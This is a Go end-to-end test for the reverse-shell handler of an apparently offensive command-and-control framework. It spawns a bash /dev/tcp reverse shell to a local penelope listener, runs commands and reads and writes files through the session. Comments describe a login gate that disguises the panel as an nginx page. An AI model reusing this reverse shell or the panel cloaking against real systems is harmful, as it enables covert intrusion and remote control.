//go:build reversee2e

// reverse_e2e_test.go 是期 5 反弹 handler 的实机端到端验证(不进常规测试,
// 用 -tags reversee2e 交叉编译后在装有 penelope 的 Linux 靶机上运行):
// 受管拉起真 penelope → 本机 bash 回连 → SyncSessions 登记进 sessions 台账 →
// 经桥接 Exec/ReadFile/WriteFile → 活动 HTTP API /api/sessions 可见 → 杀掉
// 回连客户端后会话诚实标 dead。需要 env:
//
//	ARTEX_E2E_DSN       postgres DSN(会话台账所在库)
//	ARTEX_E2E_JWTKEY    jwt.key 路径(派生 sessions secret 加密密钥)
//	ARTEX_PENELOPE_PATH penelope.py 路径
//	ARTEX_E2E_API       活动 ARTEX API 基址(如 http://127.0.0.1:8787)
//	ARTEX_E2E_ADMINPASS 管理员密码(登录取 JWT)
package server

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
)

func e2eEnv(t *testing.T, key string) string {
	t.Helper()
	v := strings.TrimSpace(os.Getenv(key))
	if v == "" {
		t.Skipf("缺 env %s,跳过实机 e2e", key)
	}
	return v
}

func TestReverseHandlerE2E(t *testing.T) {
	dsn := e2eEnv(t, "ARTEX_E2E_DSN")
	jwtPath := e2eEnv(t, "ARTEX_E2E_JWTKEY")
	e2eEnv(t, "ARTEX_PENELOPE_PATH") // newPenelopeHandler 读这个 env
	apiBase := e2eEnv(t, "ARTEX_E2E_API")
	adminPass := e2eEnv(t, "ARTEX_E2E_ADMINPASS")

	jwtKey, err := os.ReadFile(jwtPath)
	if err != nil {
		t.Fatalf("jwt.key 读取失败: %v", err)
	}
	pg, err := db.Open(dsn)
	if err != nil {
		t.Fatalf("DB 连接失败: %v", err)
	}
	defer pg.Close()

	ctx := context.Background()
	store := db.NewSessionStore(pg, jwtKey)
	reg := session.NewRegistry()

	// 清场:上期遗留的 alive reverse 行标 dead(与 initReverse 同语义),台账从干净开始。
	recs, err := store.List(ctx, db.SessionAlive)
	if err != nil {
		t.Fatalf("台账读取失败: %v", err)
	}
	for _, r := range recs {
		if r.Kind == "reverse" {
			_ = store.UpdateStatus(ctx, r.ID, db.SessionDead)
			t.Logf("清场:遗留 reverse 会话 %d 标 dead", r.ID)
		}
	}

	h := newPenelopeHandler(ctx, t.TempDir(), store, reg)
	defer func() {
		h.close()
		time.Sleep(time.Second) // 等 Wait 看护 goroutine(onExit)完成台账清理
	}()

	// 1. 受管拉起 handler(单例懒起:进程台账/日志/端口登记)。
	if err := h.ensure(ctx, 4444, "127.0.0.1", 0, 0); err != nil {
		t.Fatalf("ensure 失败: %v", err)
	}
	t.Logf("handler 已起: 监听 127.0.0.1:4444, MCP %s, 日志 %s", h.mcpURL, h.logPath(4444))

	// 2. 本机制造回连(exec 替换自身:杀进程即断 socket,死亡检测可验证)。
	client := exec.Command("bash", "-c", "exec bash -i >& /dev/tcp/127.0.0.1/4444 0>&1")
	if err := client.Start(); err != nil {
		t.Fatalf("回连客户端拉起失败: %v", err)
	}
	defer func() { _ = client.Process.Kill(); _, _ = client.Process.Wait() }()

	// 3. SyncSessions 看到会话并登记进台账/注册表。
	var dbID int64
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		n, err := h.SyncSessions(ctx)
		if err != nil {
			t.Logf("SyncSessions: %v(重试)", err)
		} else if n > 0 {
			for _, s := range reg.List() {
				if s.Kind() == "reverse" {
					dbID = s.ID()
				}
			}
			if dbID > 0 {
				break
			}
		}
		time.Sleep(time.Second)
	}
	if dbID == 0 {
		t.Fatal("30s 内未等到回连会话登记")
	}
	t.Logf("回连会话已登记: sessions 表 id=%d", dbID)

	sess, ok := reg.Get(dbID)
	if !ok {
		t.Fatalf("注册表取不到会话 %d", dbID)
	}

	// 4. 经桥接 Exec 'id' 取输出。
	stdout, stderr, err := sess.Exec(ctx, "id; hostname", 15*time.Second)
	if err != nil {
		t.Fatalf("桥接 Exec 失败: %v", err)
	}
	t.Logf("Exec 'id; hostname' → stdout=%q stderr=%q", stdout, stderr)
	if !strings.Contains(stdout, "uid=") {
		t.Fatalf("Exec 输出缺 uid=: %q", stdout)
	}

	// 5. 桥接 Test(echo 哨兵)。
	if err := sess.Test(ctx); err != nil {
		t.Fatalf("哨兵探测失败: %v", err)
	}
	t.Log("哨兵探测通过")

	// 6. ReadFile / WriteFile 经 MCP 下载/上传。
	data, err := sess.ReadFile(ctx, "/etc/hostname")
	if err != nil {
		t.Fatalf("ReadFile 失败: %v", err)
	}
	t.Logf("ReadFile /etc/hostname → %q", strings.TrimSpace(string(data)))
	if err := sess.WriteFile(ctx, "/tmp/artex_reverse_e2e.txt", []byte("ARTEX-REVERSE-E2E-OK")); err != nil {
		t.Fatalf("WriteFile 失败: %v", err)
	}
	wout, _, err := sess.Exec(ctx, "cat /tmp/artex_reverse_e2e.txt", 10*time.Second)
	if err != nil || !strings.Contains(wout, "ARTEX-REVERSE-E2E-OK") {
		t.Fatalf("WriteFile 回读校验失败: out=%q err=%v", wout, err)
	}
	t.Log("WriteFile + 目标侧回读校验通过")

	// 7. 活动 ARTEX API /api/sessions 能看到该会话(kind=reverse, alive)。
	// F14 伪装门控:设 ARTEX_E2E_GATEPATH(如 /g-<token>)时先握手取签名 cookie。
	hc := e2eHTTPClient(t, apiBase)
	token := e2eLogin(t, hc, apiBase, adminPass)
	item := e2eFindSession(t, hc, apiBase, token, dbID)
	if item["kind"] != "reverse" || item["status"] != "alive" {
		t.Fatalf("/api/sessions 行不符: %v", item)
	}
	t.Logf("/api/sessions 可见: id=%v kind=%v url=%v status=%v", item["id"], item["kind"], item["url"], item["status"])

	// 8. 死亡诚实:杀掉回连客户端。注意 penelope 自动升级会投递 python agent
	// (独立进程,另起回连socket,实测:杀原始 payload 进程不影响 agent),
	// 会话死亡 = agent 进程死亡——把 4444 的所有对端进程一起杀掉模拟目标侧全灭。
	_ = client.Process.Kill()
	_, _ = client.Process.Wait()
	if out, err := exec.Command("bash", "-c",
		"ss -tnp | grep ':4444' | grep -o 'pid=[0-9]*' | cut -d= -f2 | sort -u").Output(); err == nil {
		for _, pid := range strings.Fields(string(out)) {
			// 跳过 handler 自己的 penelope 进程(它是监听端,也出现在 ss 输出里)。
			h.mu.Lock()
			selfPid := 0
			if h.cmd != nil && h.cmd.Process != nil {
				selfPid = h.cmd.Process.Pid
			}
			h.mu.Unlock()
			if pid != fmt.Sprint(selfPid) {
				_ = exec.Command("kill", "-9", pid).Run()
				t.Logf("杀掉目标侧残留进程 pid=%s", pid)
			}
		}
	}
	deadOK := false
	for i := 0; i < 30; i++ {
		if _, err := h.SyncSessions(ctx); err != nil {
			t.Logf("SyncSessions: %v(重试)", err)
		}
		rec, err := store.Get(ctx, dbID)
		if err == nil && rec != nil && rec.Status == db.SessionDead {
			deadOK = true
			break
		}
		time.Sleep(time.Second)
	}
	if !deadOK {
		// 失败时把 penelope 日志尾部带出来,便于定位死亡检测卡在哪。
		if out, err := exec.Command("bash", "-c", "tail -20 '"+h.logPath(4444)+"'").Output(); err == nil {
			t.Logf("penelope 日志尾部:\n%s", string(out))
		}
		t.Fatal("回连断开后会话未标 dead")
	}
	if _, ok := reg.Get(dbID); ok {
		t.Fatal("死会话应移出注册表")
	}
	t.Log("回连断开后会话已诚实标 dead 并移出注册表")

	// 9. 清场:删除 e2e 台账行,不污染台账。
	_ = store.Delete(ctx, dbID)
	t.Log("e2e 台账行已清理")
}

// e2eHTTPClient 建带 cookie jar 的 HTTP 客户端;设了 ARTEX_E2E_GATEPATH 时先完成
// F14 伪装门控握手(POST password=<path 的随机段>,得签名 cookie)。
func e2eHTTPClient(t *testing.T, apiBase string) *http.Client {
	t.Helper()
	jar, err := cookiejar.New(nil)
	if err != nil {
		t.Fatal(err)
	}
	hc := &http.Client{Jar: jar, Timeout: 15 * time.Second}
	gatePath := strings.TrimSpace(os.Getenv("ARTEX_E2E_GATEPATH"))
	if gatePath == "" {
		return hc
	}
	token := strings.TrimPrefix(strings.TrimPrefix(gatePath, "/"), "g-")
	form := url.Values{"password": {token}}
	req, _ := http.NewRequest("POST", apiBase+gatePath, strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// 成功 = 303 跳 / 并下发签名 cookie;失败/限流逐字节伪装 nginx 页(200)。
	resp, err := hc.Do(req)
	if err != nil {
		t.Fatalf("门控握手失败: %v", err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	u, _ := url.Parse(apiBase)
	if len(hc.Jar.Cookies(u)) == 0 {
		t.Fatal("门控握手后无 cookie(口令不符或被限流)")
	}
	t.Log("F14 门控握手通过(签名 cookie 已取)")
	return hc
}

// e2eLogin 登录活动 ARTEX 取 access token。
func e2eLogin(t *testing.T, hc *http.Client, apiBase, pass string) string {
	t.Helper()
	body := fmt.Sprintf(`{"username":"ARTEX","password":%q}`, pass)
	req, _ := http.NewRequest("POST", apiBase+"/api/auth/login", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := hc.Do(req)
	if err != nil {
		t.Fatalf("登录请求失败: %v", err)
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		t.Fatalf("登录失败 %d: %s", resp.StatusCode, data)
	}
	var out map[string]any
	if err := json.Unmarshal(data, &out); err != nil {
		t.Fatalf("登录响应解析失败: %v", err)
	}
	for _, k := range []string{"access_token", "token", "accessToken"} {
		if v, ok := out[k].(string); ok && v != "" {
			return v
		}
	}
	t.Fatalf("登录响应无 access token: %s", data)
	return ""
}

// e2eFindSession 从 /api/sessions 找指定 id 的行。
func e2eFindSession(t *testing.T, hc *http.Client, apiBase, token string, id int64) map[string]any {
	t.Helper()
	req, _ := http.NewRequest("GET", apiBase+"/api/sessions", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := hc.Do(req)
	if err != nil {
		t.Fatalf("/api/sessions 请求失败: %v", err)
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		t.Fatalf("/api/sessions %d: %s", resp.StatusCode, data)
	}
	var out struct {
		Items []map[string]any `json:"items"`
	}
	if err := json.Unmarshal(data, &out); err != nil {
		t.Fatalf("/api/sessions 解析失败: %v", err)
	}
	for _, it := range out.Items {
		if idf, ok := it["id"].(float64); ok && int64(idf) == id {
			return it
		}
	}
	t.Fatalf("/api/sessions 找不到会话 %d: %s", id, data)
	return nil
}
